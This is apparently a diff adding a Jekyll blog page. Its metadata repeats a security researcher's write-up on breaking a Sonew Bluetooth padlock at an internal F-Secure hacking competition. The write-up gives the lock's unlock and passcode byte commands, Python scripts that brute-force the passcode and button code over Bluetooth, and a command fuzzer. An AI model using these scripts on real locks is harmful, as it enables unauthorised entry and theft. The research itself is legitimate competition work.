@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own” | YayWebsiteYay (I suck at titles)</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard: The competition took place in the UK, and I was allowed 3 attempts within 15 minutes to unlock the lock via Bluetooth or physical entry without breaking the lock. I opted to attack the lock via Bluetooth. Attack Surface Inside the lock: Some features of the lock: Communicated over Bluetooth with a physical 4 directional button unlock option If you use Bluetooth, you need to know the lock’s 6 digit passcode The phone can store this passcode for easy access The Android app contained some information about how to communicate with the lock via Bluetooth. After some reverse engineering, the following commands were discovered. Unlock the lock The bytes below can be used to unlock the lock. Bytes 1-4 were O P E N in HEX: 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD Lock the lock THe bytes below can be used to lock the lock. Bytes 1-5 were C L O S E in HEX: 0xFE, 0x43, 0x4C, 0x4F, 0x53, 0x45, 0x00, 0x00, 0x00, 0xFD Send passcode The bytes below can be used to send the lock passcode. Bytes 1-6 were characters 0x00 through 0x09 to represent 1-9: 0x29, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x28 If the passcode was correct, the lock would respond with the following bytes: 0x59 0xf0 0x00 0x95 Change passcode The bytes below can be used to change the lock passcode. Bytes 1-6 were the old passcode, bytes 7-12 were the new passcode: 0x28 0x00 0x00 0x00 0x01 0x02 0x03 0x09 0x09 0x09 0x09 0x09 0x09 0x29 If the old passcode was correct, the lock would respond with the following bytes: 0x58 0xf0 0x00 0x95 Change 4 directional button code The following bytes can be used to change the 4 directional button code. Bytes 1-6 were the old code, bytes 7-12 were the new code, characters 0x01-0x04 were used to represent up/down/left/right respectively: 0xff 0x01 0x02 0x01 0x02 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe If the old button code was correct, the lock would respond with the following bytes: 0x60 0xf0 0x00 0x95 Brute Force Option The lock did not have any form of lock out functionality, making brute forcing the lock code a viable attack path. My immidate thought was “This is a great idea!” followed by “No wait this is a stupid idea. Oh well lets make a PoC and see what happens”. So the first script was created: def guess_password_method(i): password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28]) open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD]) if len(str(i)) &lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) code = padding[:0] + &#39;0&#39; + padding[0:1] + &#39;0&#39; + padding[1:2] + &#39;0&#39; + padding[2:3] + &#39;0&#39; + padding[3:4] + &#39;0&#39; + padding[4:5] + &#39;0&#39; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: password_code[i2+1] = temp_code[i2] i2 = i2 + 1 #if i % 100 == 0: # print(&#39;sending 0xff 0x00 0xff&#39;) # device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, bytearray([0xFF, 0x00, 0xFF])) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, password_code) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, open_code) yay = padding + &quot; &quot; + code return yay def handle_data(handle, value): response = hexlify(value) if &quot;59f00095&quot; in str(response): print(&quot;Received &#39;guess password success&#39; repsonse (%s)&quot; % str(response)) As you can probably guess, while this worked, the amount of time to brute force the passcode was obsurd…like over 24 hours to brute force the lock. Obviously does not qualify as a valid entry. But what happens if we instead brute force the 4 directional button code: def change_physical_method(i): # ff xx xx xx xx xx xx yy yy yy yy yy yy fe physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to &quot;changed physical code&quot; if len(str(i)) &lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &#39;0&#39; + padding[0:1] + &#39;0&#39; + padding[1:2] + &#39;0&#39; + padding[2:3] + &#39;0&#39; + padding[3:4] + &#39;0&#39; + padding[4:5] + &#39;0&#39; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 0: return if temp_code[i2] &gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) # 60 f0 00 95 if &quot;60f00095&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) This method took a maximum of 4 minutes. Much better and easily within the alloted time for the competition. Hidden Command At this point the competition was still like 2 months away, so I decided to do something even more stupid: try to brute force any hidden commands in the lock. What I noticed during this research is that the lock always responded with something if you send it a valid command over Bluetooth. And based on what was enumerated so far, a “valid command” looks like the following: 0xXX - beginning byte |__0xYY 0xYY 0xYY 0xYY - some data |__0xZZ - end byte For example, sending the real OPEN command 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD would result in the lock responding with some bytes, but sending a different payload, such as 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFE would result in the lock not sending any data back. Additionally, the middle data must be the correct length. For example, sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD is a valid command, but sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0xFD is not a valid command. The lock also stopped all communications if the payload was over 20 bytes. So in theory, a valid payload would look like: 1 byte at the beginning Anywhere between 1 and 18 bytes for the middle data 1 byte at the end So lets make a script which will attempt to find additional commands within the above parameters: import pygatt from binascii import hexlify import sys import math from concurrent import futures import random import time adapter = pygatt.backends.GATTToolBackend(&#39;hci0&#39;) def handle_data(handle, value): response = hexlify(value) print(&quot;Received repsonse (%s)&quot; % str(response)) def decimal_to_hexadecimal(dec): decimal = int(dec) return hex(decimal) def fuzz_function(payload1, payload2, paddingCounter): #create temp code temp_code_length = paddingCounter + 2 temp_code_array = bytearray(temp_code_length) #create byte array payload temp_code_array[0] = payload1 temp_code_array[temp_code_length - 1] = payload2 #temp_code_array[temp_code_length] print(&quot;Payload1: %s, PaddingCounter: %s, Payload2: %s&quot; % (payload1, paddingCounter, payload2)) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, temp_code_array) adapter.start() device = adapter.connect(&#39;28:EC:9A:09:C7:2B&#39;) device.subscribe(&quot;0000ffd4-0000-1000-8000-00805f9b34fb&quot;,callback=handle_data, wait_for_response=False) device.subscribe(&quot;0000ffdf-0000-1000-8000-00805f9b34fb&quot;, indication=False, wait_for_response=True) payload1 = 0 paddingCounter = 1 # modify payload 2 payload2 = 0 while payload2 != 256: while paddingCounter != 19: fuzz_function(payload1, payload2, paddingCounter) paddingCounter = paddingCounter + 1 paddingCounter = 1 payload2 = payload2 + 1 adapter.stop() This script was used against 2 different locks at the same time, and I went through like 10 batteries. It took 2 months to completely fuzz all possible commands, and that includes the amount of times the locks randomly decided to just disconnect. Thankfully some hidden commands were found: 0xC9 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x9C 0xEF 0xXX 0xXX 0xXX 0xXX 0xF1 0xFD 0xXX 0xXX 0xXX 0xXX 0xFC I have no idea what the last two commands do, but I did figure out what the first command does: send physical code. So we now have another viable entry for the competition: def guess_physical_method(i): physical_code = bytearray([0xc9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c]) # changed to &quot;send physical code&quot; if len(str(i)) &lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &#39;0&#39; + padding[0:1] + &#39;0&#39; + padding[1:2] + &#39;0&#39; + padding[2:3] + &#39;0&#39; + padding[3:4] + &#39;0&#39; + padding[4:5] + &#39;0&#39; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 0: return if temp_code[i2] &gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) if &quot;e0f0000e&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) The Competition After I had finished brute forcing all of the commands, I still had some time before the competition. So I wanted to do something fun…such as programming a robot to brute force the lock for me: Unfortunatley the competition layout was a giant counter, and having my little bot wonder around the counter with all the gadgets wasn’t the best idea. So it just stood there while it hacked for me: Disclosure and Files There was none lol. One week after the competition, the world went into lockdown and our office became more focused on trying to adjust to remote working. Files for this research are here: https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/" />
+<meta property="og:description" content="In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard: The competition took place in the UK, and I was allowed 3 attempts within 15 minutes to unlock the lock via Bluetooth or physical entry without breaking the lock. I opted to attack the lock via Bluetooth. Attack Surface Inside the lock: Some features of the lock: Communicated over Bluetooth with a physical 4 directional button unlock option If you use Bluetooth, you need to know the lock’s 6 digit passcode The phone can store this passcode for easy access The Android app contained some information about how to communicate with the lock via Bluetooth. After some reverse engineering, the following commands were discovered. Unlock the lock The bytes below can be used to unlock the lock. Bytes 1-4 were O P E N in HEX: 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD Lock the lock THe bytes below can be used to lock the lock. Bytes 1-5 were C L O S E in HEX: 0xFE, 0x43, 0x4C, 0x4F, 0x53, 0x45, 0x00, 0x00, 0x00, 0xFD Send passcode The bytes below can be used to send the lock passcode. Bytes 1-6 were characters 0x00 through 0x09 to represent 1-9: 0x29, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x28 If the passcode was correct, the lock would respond with the following bytes: 0x59 0xf0 0x00 0x95 Change passcode The bytes below can be used to change the lock passcode. Bytes 1-6 were the old passcode, bytes 7-12 were the new passcode: 0x28 0x00 0x00 0x00 0x01 0x02 0x03 0x09 0x09 0x09 0x09 0x09 0x09 0x29 If the old passcode was correct, the lock would respond with the following bytes: 0x58 0xf0 0x00 0x95 Change 4 directional button code The following bytes can be used to change the 4 directional button code. Bytes 1-6 were the old code, bytes 7-12 were the new code, characters 0x01-0x04 were used to represent up/down/left/right respectively: 0xff 0x01 0x02 0x01 0x02 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe If the old button code was correct, the lock would respond with the following bytes: 0x60 0xf0 0x00 0x95 Brute Force Option The lock did not have any form of lock out functionality, making brute forcing the lock code a viable attack path. My immidate thought was “This is a great idea!” followed by “No wait this is a stupid idea. Oh well lets make a PoC and see what happens”. So the first script was created: def guess_password_method(i): password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28]) open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD]) if len(str(i)) &lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) code = padding[:0] + &#39;0&#39; + padding[0:1] + &#39;0&#39; + padding[1:2] + &#39;0&#39; + padding[2:3] + &#39;0&#39; + padding[3:4] + &#39;0&#39; + padding[4:5] + &#39;0&#39; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: password_code[i2+1] = temp_code[i2] i2 = i2 + 1 #if i % 100 == 0: # print(&#39;sending 0xff 0x00 0xff&#39;) # device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, bytearray([0xFF, 0x00, 0xFF])) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, password_code) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, open_code) yay = padding + &quot; &quot; + code return yay def handle_data(handle, value): response = hexlify(value) if &quot;59f00095&quot; in str(response): print(&quot;Received &#39;guess password success&#39; repsonse (%s)&quot; % str(response)) As you can probably guess, while this worked, the amount of time to brute force the passcode was obsurd…like over 24 hours to brute force the lock. Obviously does not qualify as a valid entry. But what happens if we instead brute force the 4 directional button code: def change_physical_method(i): # ff xx xx xx xx xx xx yy yy yy yy yy yy fe physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to &quot;changed physical code&quot; if len(str(i)) &lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &#39;0&#39; + padding[0:1] + &#39;0&#39; + padding[1:2] + &#39;0&#39; + padding[2:3] + &#39;0&#39; + padding[3:4] + &#39;0&#39; + padding[4:5] + &#39;0&#39; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 0: return if temp_code[i2] &gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) # 60 f0 00 95 if &quot;60f00095&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) This method took a maximum of 4 minutes. Much better and easily within the alloted time for the competition. Hidden Command At this point the competition was still like 2 months away, so I decided to do something even more stupid: try to brute force any hidden commands in the lock. What I noticed during this research is that the lock always responded with something if you send it a valid command over Bluetooth. And based on what was enumerated so far, a “valid command” looks like the following: 0xXX - beginning byte |__0xYY 0xYY 0xYY 0xYY - some data |__0xZZ - end byte For example, sending the real OPEN command 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD would result in the lock responding with some bytes, but sending a different payload, such as 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFE would result in the lock not sending any data back. Additionally, the middle data must be the correct length. For example, sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD is a valid command, but sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0xFD is not a valid command. The lock also stopped all communications if the payload was over 20 bytes. So in theory, a valid payload would look like: 1 byte at the beginning Anywhere between 1 and 18 bytes for the middle data 1 byte at the end So lets make a script which will attempt to find additional commands within the above parameters: import pygatt from binascii import hexlify import sys import math from concurrent import futures import random import time adapter = pygatt.backends.GATTToolBackend(&#39;hci0&#39;) def handle_data(handle, value): response = hexlify(value) print(&quot;Received repsonse (%s)&quot; % str(response)) def decimal_to_hexadecimal(dec): decimal = int(dec) return hex(decimal) def fuzz_function(payload1, payload2, paddingCounter): #create temp code temp_code_length = paddingCounter + 2 temp_code_array = bytearray(temp_code_length) #create byte array payload temp_code_array[0] = payload1 temp_code_array[temp_code_length - 1] = payload2 #temp_code_array[temp_code_length] print(&quot;Payload1: %s, PaddingCounter: %s, Payload2: %s&quot; % (payload1, paddingCounter, payload2)) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, temp_code_array) adapter.start() device = adapter.connect(&#39;28:EC:9A:09:C7:2B&#39;) device.subscribe(&quot;0000ffd4-0000-1000-8000-00805f9b34fb&quot;,callback=handle_data, wait_for_response=False) device.subscribe(&quot;0000ffdf-0000-1000-8000-00805f9b34fb&quot;, indication=False, wait_for_response=True) payload1 = 0 paddingCounter = 1 # modify payload 2 payload2 = 0 while payload2 != 256: while paddingCounter != 19: fuzz_function(payload1, payload2, paddingCounter) paddingCounter = paddingCounter + 1 paddingCounter = 1 payload2 = payload2 + 1 adapter.stop() This script was used against 2 different locks at the same time, and I went through like 10 batteries. It took 2 months to completely fuzz all possible commands, and that includes the amount of times the locks randomly decided to just disconnect. Thankfully some hidden commands were found: 0xC9 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x9C 0xEF 0xXX 0xXX 0xXX 0xXX 0xF1 0xFD 0xXX 0xXX 0xXX 0xXX 0xFC I have no idea what the last two commands do, but I did figure out what the first command does: send physical code. So we now have another viable entry for the competition: def guess_physical_method(i): physical_code = bytearray([0xc9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c]) # changed to &quot;send physical code&quot; if len(str(i)) &lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &#39;0&#39; + padding[0:1] + &#39;0&#39; + padding[1:2] + &#39;0&#39; + padding[2:3] + &#39;0&#39; + padding[3:4] + &#39;0&#39; + padding[4:5] + &#39;0&#39; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 0: return if temp_code[i2] &gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) if &quot;e0f0000e&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) The Competition After I had finished brute forcing all of the commands, I still had some time before the competition. So I wanted to do something fun…such as programming a robot to brute force the lock for me: Unfortunatley the competition layout was a giant counter, and having my little bot wonder around the counter with all the gadgets wasn’t the best idea. So it just stood there while it hacked for me: Disclosure and Files There was none lol. One week after the competition, the world went into lockdown and our office became more focused on trying to adjust to remote working. Files for this research are here: https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/" />
+<link rel="canonical" href="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html" />
+<meta property="og:url" content="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html" />
+<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-12-31T10:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”","dateModified":"2021-12-31T10:00:00-05:00","datePublished":"2021-12-31T10:00:00-05:00","url":"http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html"},"description":"In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard: The competition took place in the UK, and I was allowed 3 attempts within 15 minutes to unlock the lock via Bluetooth or physical entry without breaking the lock. I opted to attack the lock via Bluetooth. Attack Surface Inside the lock: Some features of the lock: Communicated over Bluetooth with a physical 4 directional button unlock option If you use Bluetooth, you need to know the lock’s 6 digit passcode The phone can store this passcode for easy access The Android app contained some information about how to communicate with the lock via Bluetooth. After some reverse engineering, the following commands were discovered. Unlock the lock The bytes below can be used to unlock the lock. Bytes 1-4 were O P E N in HEX: 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD Lock the lock THe bytes below can be used to lock the lock. Bytes 1-5 were C L O S E in HEX: 0xFE, 0x43, 0x4C, 0x4F, 0x53, 0x45, 0x00, 0x00, 0x00, 0xFD Send passcode The bytes below can be used to send the lock passcode. Bytes 1-6 were characters 0x00 through 0x09 to represent 1-9: 0x29, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x28 If the passcode was correct, the lock would respond with the following bytes: 0x59 0xf0 0x00 0x95 Change passcode The bytes below can be used to change the lock passcode. Bytes 1-6 were the old passcode, bytes 7-12 were the new passcode: 0x28 0x00 0x00 0x00 0x01 0x02 0x03 0x09 0x09 0x09 0x09 0x09 0x09 0x29 If the old passcode was correct, the lock would respond with the following bytes: 0x58 0xf0 0x00 0x95 Change 4 directional button code The following bytes can be used to change the 4 directional button code. Bytes 1-6 were the old code, bytes 7-12 were the new code, characters 0x01-0x04 were used to represent up/down/left/right respectively: 0xff 0x01 0x02 0x01 0x02 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe If the old button code was correct, the lock would respond with the following bytes: 0x60 0xf0 0x00 0x95 Brute Force Option The lock did not have any form of lock out functionality, making brute forcing the lock code a viable attack path. My immidate thought was “This is a great idea!” followed by “No wait this is a stupid idea. Oh well lets make a PoC and see what happens”. So the first script was created: def guess_password_method(i): password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28]) open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD]) if len(str(i)) &lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) code = padding[:0] + &#39;0&#39; + padding[0:1] + &#39;0&#39; + padding[1:2] + &#39;0&#39; + padding[2:3] + &#39;0&#39; + padding[3:4] + &#39;0&#39; + padding[4:5] + &#39;0&#39; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: password_code[i2+1] = temp_code[i2] i2 = i2 + 1 #if i % 100 == 0: # print(&#39;sending 0xff 0x00 0xff&#39;) # device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, bytearray([0xFF, 0x00, 0xFF])) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, password_code) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, open_code) yay = padding + &quot; &quot; + code return yay def handle_data(handle, value): response = hexlify(value) if &quot;59f00095&quot; in str(response): print(&quot;Received &#39;guess password success&#39; repsonse (%s)&quot; % str(response)) As you can probably guess, while this worked, the amount of time to brute force the passcode was obsurd…like over 24 hours to brute force the lock. Obviously does not qualify as a valid entry. But what happens if we instead brute force the 4 directional button code: def change_physical_method(i): # ff xx xx xx xx xx xx yy yy yy yy yy yy fe physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to &quot;changed physical code&quot; if len(str(i)) &lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &#39;0&#39; + padding[0:1] + &#39;0&#39; + padding[1:2] + &#39;0&#39; + padding[2:3] + &#39;0&#39; + padding[3:4] + &#39;0&#39; + padding[4:5] + &#39;0&#39; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 0: return if temp_code[i2] &gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) # 60 f0 00 95 if &quot;60f00095&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) This method took a maximum of 4 minutes. Much better and easily within the alloted time for the competition. Hidden Command At this point the competition was still like 2 months away, so I decided to do something even more stupid: try to brute force any hidden commands in the lock. What I noticed during this research is that the lock always responded with something if you send it a valid command over Bluetooth. And based on what was enumerated so far, a “valid command” looks like the following: 0xXX - beginning byte |__0xYY 0xYY 0xYY 0xYY - some data |__0xZZ - end byte For example, sending the real OPEN command 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD would result in the lock responding with some bytes, but sending a different payload, such as 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFE would result in the lock not sending any data back. Additionally, the middle data must be the correct length. For example, sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD is a valid command, but sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0xFD is not a valid command. The lock also stopped all communications if the payload was over 20 bytes. So in theory, a valid payload would look like: 1 byte at the beginning Anywhere between 1 and 18 bytes for the middle data 1 byte at the end So lets make a script which will attempt to find additional commands within the above parameters: import pygatt from binascii import hexlify import sys import math from concurrent import futures import random import time adapter = pygatt.backends.GATTToolBackend(&#39;hci0&#39;) def handle_data(handle, value): response = hexlify(value) print(&quot;Received repsonse (%s)&quot; % str(response)) def decimal_to_hexadecimal(dec): decimal = int(dec) return hex(decimal) def fuzz_function(payload1, payload2, paddingCounter): #create temp code temp_code_length = paddingCounter + 2 temp_code_array = bytearray(temp_code_length) #create byte array payload temp_code_array[0] = payload1 temp_code_array[temp_code_length - 1] = payload2 #temp_code_array[temp_code_length] print(&quot;Payload1: %s, PaddingCounter: %s, Payload2: %s&quot; % (payload1, paddingCounter, payload2)) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, temp_code_array) adapter.start() device = adapter.connect(&#39;28:EC:9A:09:C7:2B&#39;) device.subscribe(&quot;0000ffd4-0000-1000-8000-00805f9b34fb&quot;,callback=handle_data, wait_for_response=False) device.subscribe(&quot;0000ffdf-0000-1000-8000-00805f9b34fb&quot;, indication=False, wait_for_response=True) payload1 = 0 paddingCounter = 1 # modify payload 2 payload2 = 0 while payload2 != 256: while paddingCounter != 19: fuzz_function(payload1, payload2, paddingCounter) paddingCounter = paddingCounter + 1 paddingCounter = 1 payload2 = payload2 + 1 adapter.stop() This script was used against 2 different locks at the same time, and I went through like 10 batteries. It took 2 months to completely fuzz all possible commands, and that includes the amount of times the locks randomly decided to just disconnect. Thankfully some hidden commands were found: 0xC9 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x9C 0xEF 0xXX 0xXX 0xXX 0xXX 0xF1 0xFD 0xXX 0xXX 0xXX 0xXX 0xFC I have no idea what the last two commands do, but I did figure out what the first command does: send physical code. So we now have another viable entry for the competition: def guess_physical_method(i): physical_code = bytearray([0xc9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c]) # changed to &quot;send physical code&quot; if len(str(i)) &lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &#39;0&#39; + padding[0:1] + &#39;0&#39; + padding[1:2] + &#39;0&#39; + padding[2:3] + &#39;0&#39; + padding[3:4] + &#39;0&#39; + padding[4:5] + &#39;0&#39; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 0: return if temp_code[i2] &gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) if &quot;e0f0000e&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) The Competition After I had finished brute forcing all of the commands, I still had some time before the competition. So I wanted to do something fun…such as programming a robot to brute force the lock for me: Unfortunatley the competition layout was a giant counter, and having my little bot wonder around the counter with all the gadgets wasn’t the best idea. So it just stood there while it hacked for me: Disclosure and Files There was none lol. One week after the competition, the world went into lockdown and our office became more focused on trying to adjust to remote working. Files for this research are here: https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/cves/">My CVEs</a><a class="page-link" href="/published-research/">Published Research</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
